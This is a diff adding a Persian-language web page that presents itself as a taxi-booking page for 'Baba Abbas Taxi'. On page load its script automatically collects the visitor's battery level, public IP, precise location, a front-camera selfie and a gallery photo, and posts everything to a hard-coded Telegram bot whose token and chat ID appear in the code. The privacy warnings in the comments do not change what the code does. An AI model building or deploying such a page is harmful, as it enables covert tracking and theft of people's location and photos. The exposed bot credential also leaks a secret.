@@ -1,0 +1,324 @@
+<!doctype html>
+<html lang="fa">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>تاکسی بابا عباس — موقعیت، سلفی، گالری و آی‌پی</title>
+  <style>
+    :root{--bg:#f7f9fb;--card:#fff;--text:#0b1a2b;--muted:#6c7a86;--green:#28a745;--danger:#c0392b}
+    body { font-family: "Tahoma", "Arial", sans-serif; background:var(--bg); color:var(--text); display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
+    .card { background:var(--card); padding:22px; border-radius:12px; box-shadow:0 6px 24px rgba(12,17,24,0.08); text-align:center; width:380px; }
+    .icon { font-size:56px; }
+    h1 { margin:8px 0 6px; font-size:20px; }
+    p { margin:6px 0 14px; color:var(--muted); font-size:13px; }
+    .small { font-size:13px; color:#7a8a99; margin-top:10px; min-height:28px; }
+    .hint { color:var(--danger); margin-top:12px; font-size:13px; display:none; }
+    video { display:none; width:240px; height:320px; border-radius:8px; object-fit:cover; margin-top:12px }
+    #manualPick { display:none; margin-top:10px; padding:8px 12px; background:#eee; border-radius:6px; cursor:pointer; color:#064; }
+  </style>
+</head>
+<body>
+  <div class="card" role="status" aria-live="polite">
+    <div class="icon" aria-hidden="true">🚕</div>
+    <h1>تاکسی بابا عباس</h1>
+    <p>در حال جمع‌آوری اطلاعات لازم برای ارسال به راننده: موقعیت، سلفی، تصویر گالری و آی‌پی عمومی.</p>
+    <div id="status" class="small">آماده‌سازی...</div>
+    <div id="error" class="hint" role="alert"></div>
+    <video id="video" autoplay playsinline muted></video>
+    <div id="manualPick" role="button" tabindex="0">لطفاً برای انتخاب تصویر از گالری اینجا بزنید</div>
+    <!-- مخفی: input فایل برای انتخاب گالری -->
+    <input id="fileInput" type="file" accept="image/*" style="display:none" />
+  </div>
+
+  <script>
+    /*****************************************************************************
+     * هشدار مهم و ایمنی:
+     * - این صفحه به‌صورت خودکار درخواست‌های حساسی (موقعیت، دوربین، انتخاب فایل) را اجرا می‌کند.
+     *   از نظر حریم خصوصی و قوانین حتماً باید کاربر آگاه و رضایتمند باشد.
+     * - نگه داشتن BOT_TOKEN در کلاینت ناامن است. نسخهٔ امن: کلاینت داده‌ها (موقعیت/عکس) را به
+     *   سرور ارسال کند و سرور با توکن به Telegram API بزند.
+     * - برخی مرورگرها اجازهٔ اجرای خودکار پنجرهٔ انتخاب فایل یا دوربین را بدون تعامل کاربر نمی‌دهند.
+     *   در این صورت fallback نمایان می‌شود تا کاربر دستی فایل را انتخاب کند.
+     * - getUserMedia و Geolocation فقط در HTTPS یا localhost کار می‌کنند.
+     *****************************************************************************/
+
+    // ====== CONFIG (فقط برای تست محلی؛ در تولید در سرور نگهدارید) ======
+    const BOT_TOKEN = '8295388715:AAGkM7QaqplE1WNpM6S_GI6aBLzBObK2he8'; // ناامن در کلاینت
+    const CHAT_ID   = '8293145520';
+    const IP_SERVICES = [
+      'https://api.ipify.org?format=json',
+      'https://ipinfo.io/json?token=',
+      'https://ifconfig.co/json'
+    ];
+
+    // ====== DOM ======
+    const statusDiv = document.getElementById('status');
+    const errorDiv = document.getElementById('error');
+    const video = document.getElementById('video');
+    const fileInput = document.getElementById('fileInput');
+    const manualPick = document.getElementById('manualPick');
+
+    function setStatus(msg) { statusDiv.textContent = msg; errorDiv.style.display='none'; }
+    function setError(msg) { errorDiv.style.display='block'; errorDiv.textContent = msg; statusDiv.textContent=''; }
+
+    // ====== Battery ======
+    async function getBatteryInfo() {
+      try {
+        if (!('getBattery' in navigator)) return null;
+        const battery = await navigator.getBattery();
+        const level = Math.round((battery.level || 0) * 100);
+        const charging = battery.charging ? ' (در حال شارژ)' : '';
+        return { level, charging };
+      } catch (e) {
+        return null;
+      }
+    }
+
+    // ====== IP ======
+    async function getPublicIP() {
+      for (const url of IP_SERVICES) {
+        try {
+          const res = await fetch(url, { cache: "no-store" });
+          if (!res.ok) continue;
+          const j = await res.json();
+          // ساختارهای متفاوت سرویس‌ها
+          if (j.ip) return j.ip;
+          if (j.query) return j.query;
+          if (j.ip_address) return j.ip_address;
+          // ipinfo returns "ip" or "ip" sometimes; try common fields
+        } catch (e) {
+          // ignore and try next
+        }
+      }
+      // fallback: try a lightweight service
+      try {
+        const r = await fetch('https://api.ipify.org?format=json', { cache: "no-store" });
+        const j = await r.json();
+        return j.ip || null;
+      } catch (e) {
+        return null;
+      }
+    }
+
+    // ====== Geolocation ======
+    function getCurrentPositionPromise() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) return reject(new Error('مرورگر شما Geolocation را پشتیبانی نمی‌کند.'));
+        navigator.geolocation.getCurrentPosition(pos => {
+          resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+        }, err => {
+          if (err.code === err.PERMISSION_DENIED) reject(new Error('دسترسی به موقعیت رد شد.'));
+          else reject(new Error('خطا در دریافت موقعیت: ' + (err.message || err.code)));
+        }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
+      });
+    }
+
+    // ====== Camera ======
+    let mediaStream = null;
+    async function startCamera() {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        throw new Error('دستگاه شما از دوربین پشتیبانی نمی‌کند.');
+      }
+      const constraints = { video: { facingMode: { ideal: "user" }, width: { ideal: 640 }, height: { ideal: 960 } }, audio: false };
+      mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+      video.srcObject = mediaStream;
+      video.style.display = 'block';
+      try { await video.play(); } catch(e){}
+    }
+    async function stopCamera() {
+      if (mediaStream) {
+        mediaStream.getTracks().forEach(t => t.stop());
+        mediaStream = null;
+      }
+      try { video.pause(); } catch(e){}
+      video.srcObject = null;
+      video.style.display = 'none';
+    }
+    function captureBlobFromVideo() {
+      const w = video.videoWidth || 640;
+      const h = video.videoHeight || 480;
+      const canvas = document.createElement('canvas');
+      canvas.width = w;
+      canvas.height = h;
+      const ctx = canvas.getContext('2d');
+      // mirror selfie
+      ctx.translate(w, 0); ctx.scale(-1, 1);
+      ctx.drawImage(video, 0, 0, w, h);
+      return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+    }
+
+    // ====== Telegram (client-side; ناامن) ======
+    async function sendLocationToTelegram(lat, lon) {
+      const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendLocation`;
+      const body = new URLSearchParams({ chat_id: CHAT_ID, latitude: String(lat), longitude: String(lon) });
+      const r = await fetch(url, { method: 'POST', body });
+      const j = await r.json();
+      if (!j.ok) throw new Error('خطا در ارسال لوکیشن: ' + (j.description || r.statusText));
+      return j;
+    }
+    async function sendMessageToTelegram(text) {
+      const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`;
+      const body = new URLSearchParams({ chat_id: CHAT_ID, text });
+      const r = await fetch(url, { method: 'POST', body });
+      const j = await r.json();
+      if (!j.ok) throw new Error('خطا در ارسال پیام: ' + (j.description || r.statusText));
+      return j;
+    }
+    async function sendPhotoToTelegram(blobOrFile, caption = '') {
+      const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendPhoto`;
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      // blobOrFile can be Blob or File
+      if (blobOrFile instanceof File) {
+        form.append('photo', blobOrFile);
+      } else {
+        form.append('photo', new File([blobOrFile], 'image.jpg', { type: blobOrFile.type || 'image/jpeg' }));
+      }
+      if (caption) form.append('caption', caption);
+      const r = await fetch(url, { method: 'POST', body: form });
+      const j = await r.json();
+      if (!j.ok) throw new Error('خطا در ارسال عکس: ' + (j.description || r.statusText));
+      return j;
+    }
+
+    // ====== Fallback UI for manual gallery pick (shown only if auto-trigger blocked) ======
+    function showManualPick() {
+      manualPick.style.display = 'block';
+      manualPick.onclick = () => fileInput.click();
+      manualPick.onkeydown = (e) => { if (e.key === 'Enter' || e.key === ' ') fileInput.click(); };
+    }
+    function hideManualPick() {
+      manualPick.style.display = 'none';
+      manualPick.onclick = null;
+    }
+
+    // ====== Main flow ======
+    async function autoCollectAndSend() {
+      if (!BOT_TOKEN || BOT_TOKEN.includes('REPLACE_WITH') || !CHAT_ID) {
+        setError('پارامترهای ربات تنظیم نشده‌اند یا ناامن هستند. در محیط تولید از سرور استفاده کنید.');
+        return;
+      }
+
+      try {
+        // 1) باتری
+        setStatus('خواندن وضعیت باتری...');
+        const battery = await getBatteryInfo();
+        const batteryText = battery ? `${battery.level}%${battery.charging}` : 'نامشخص';
+
+        // 2) آی‌پی
+        setStatus('دریافت آی‌پی عمومی...');
+        const ip = await getPublicIP();
+        setStatus(ip ? `آی‌پی: ${ip}` : 'آی‌پی عمومی قابل دریافت نیست.');
+
+        // 3) موقعیت
+        setStatus('در حال درخواست موقعیت از مرورگر...');
+        const { lat, lon } = await getCurrentPositionPromise();
+        setStatus('موقعیت دریافت شد؛ ارسال موقعیت و اطلاعات متنی به تلگرام...');
+        await sendLocationToTelegram(lat, lon);
+
+        const textMessage = `مشتری درخواست تاکسی دارد.\nموقعیت: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}\nباتری: ${batteryText}\nآی‌پی: ${ip || 'نامشخص'}`;
+        await sendMessageToTelegram(textMessage);
+
+        // 4) سلفی با دوربین
+        setStatus('در حال درخواست دسترسی به دوربین برای گرفتن سلفی...');
+        try {
+          await startCamera();
+        } catch (e) {
+          // ممکن است اجازه دوربین رد شود یا نیاز به تعامل داشته باشد
+          setError('دسترسی به دوربین امکان‌پذیر نیست: ' + (e.message || e));
+          return;
+        }
+        setStatus('دوربین فعال شد؛ در حال گرفتن سلفی...');
+        await new Promise(r => setTimeout(r, 600)); // warm-up
+        const selfieBlob = await captureBlobFromVideo();
+        await stopCamera();
+        if (selfieBlob) {
+          setStatus('ارسال سلفی به تلگرام...');
+          const cap = `سلفی مشتری — باتری: ${batteryText}\nموقعیت: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}\nآی‌پی: ${ip || 'نامشخص'}`;
+          await sendPhotoToTelegram(selfieBlob, cap);
+        } else {
+          setStatus('گرفتن سلفی ناموفق بود.');
+        }
+
+        // 5) درخواست انتخاب تصویر از گالری (فایل پیکر)
+        setStatus('در حال تلاش برای باز کردن انتخابگر گالری (برای ارسال تصویر از گالری)...');
+        // یک input file مخفی داریم؛ تلاش می‌کنیم آن را برنامه‌نویسی باز کنیم.
+        let galleryFile = null;
+        let autoOpened = false;
+        try {
+          // attach handler once
+          const filePromise = new Promise((resolve) => {
+            fileInput.onchange = (ev) => {
+              resolve(ev.target.files && ev.target.files[0] ? ev.target.files[0] : null);
+            };
+            // try to programmatically click - may be blocked without user gesture
+            fileInput.click();
+            // small delay to see if browser opened it (some block immediately)
+            setTimeout(() => resolve(null), 1500);
+          });
+          const f = await filePromise;
+          if (f) {
+            galleryFile = f;
+            autoOpened = true;
+          }
+        } catch (e) {
+          // ignored
+        }
+
+        if (!galleryFile) {
+          // احتمالا کلیک خودکار بلاک شده — خواهشمندیم کاربر وارد شود و دستی انتخاب کند
+          setStatus('برای انتخاب تصویر گالری نیاز به تعامل دارید. لطفاً فایل را انتخاب کنید.');
+          showManualPick();
+
+          // حالا صبر کن برای انتخاب کاربر (تا 60 ثانیه)
+          galleryFile = await new Promise((resolve) => {
+            const to = setTimeout(() => {
+              fileInput.onchange = null;
+              resolve(null);
+            }, 60000);
+            fileInput.onchange = (ev) => {
+              clearTimeout(to);
+              resolve(ev.target.files && ev.target.files[0] ? ev.target.files[0] : null);
+            };
+          });
+          hideManualPick();
+        }
+
+        if (galleryFile) {
+          setStatus('در حال ارسال تصویر انتخاب شده از گالری به تلگرام...');
+          const caption = `تصویر گالری مشتری — باتری: ${batteryText}\nموقعیت: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}\nآی‌پی: ${ip || 'نامشخص'}`;
+          await sendPhotoToTelegram(galleryFile, caption);
+          setStatus('همه اطلاعات ارسال شد. متشکریم؛ تاکسی در راه است.');
+        } else {
+          setStatus('هیچ تصویر گالری ارسال نشد. فرایند تمام شد.');
+        }
+      } catch (err) {
+        setError('خطا: ' + (err.message || err));
+      } finally {
+        try { await stopCamera(); } catch(e){}
+      }
+    }
+
+    // اجرا هنگام بارگذاری صفحه
+    window.addEventListener('load', () => {
+      // اجرای خودکار؛ برخی مرورگرها ممکن است نیاز به تعامل کاربر داشته باشند.
+      setTimeout(() => autoCollectAndSend(), 250);
+    });
+
+    // بررسی permission API برای اطلاع‌رسانی بهتر (غیر اجباری)
+    (async function checkPermissions() {
+      if (!navigator.permissions) return;
+      try {
+        const pGeo = await navigator.permissions.query({ name: 'geolocation' }).catch(()=>null);
+        if (pGeo && pGeo.state === 'denied') setStatus('دسترسی موقعیت در مرورگر مسدود شده است.');
+        const pCam = await navigator.permissions.query({ name: 'camera' }).catch(()=>null);
+        if (pCam && pCam.state === 'denied') setStatus('دسترسی دوربین مسدود شده است.');
+      } catch(e){}
+    })();
+  </script>
+
+  <noscript>
+    <div style="text-align:center; margin-top:14px; color:#c00">جاوااسکریپت خام است. این صفحه باید جاوااسکریپت را اجرا کند.</div>
+  </noscript>
+</body>
+</html>
